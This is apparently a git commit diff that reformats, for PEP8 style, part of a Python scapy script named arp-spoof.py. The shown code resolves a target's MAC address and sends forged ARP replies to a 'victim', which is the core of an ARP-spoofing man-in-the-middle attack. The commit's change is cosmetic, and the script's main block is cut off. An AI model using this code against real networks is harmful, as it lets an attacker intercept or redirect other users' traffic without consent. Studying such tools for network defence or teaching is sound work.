467874cc4ffb92b47491bd5bf577a1052bb57083
Evgeny Kuryatov <evgeny.kuryatov@netcracker.com>
2021-02-22 15:41:16 +0300

    Update with PEP8

--- arp-spoof.py
+++ arp-spoof.py
@@ -14,19 +14,22 @@ def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+    answered_list = scapy.srp(
+        arp_request_broadcast,
+        timeout=5,
+        verbose=False)[0]
     return answered_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoof_ip):
     """ Send fake arp answer to victim """
     arp_answer = scapy.ARP(
-       op = 2,
-       pdst = target_ip,
-       hwdst = get_mac(target_ip),
-       psrc = spoof_ip
+       op=2,
+       pdst=target_ip,
+       hwdst=get_mac(target_ip),
+       psrc=spoof_ip
     )
-    scapy.send(arp_answer, verbose = False)
+    scapy.send(arp_answer, verbose=False)
 
 
 if __name__ == "__main__":
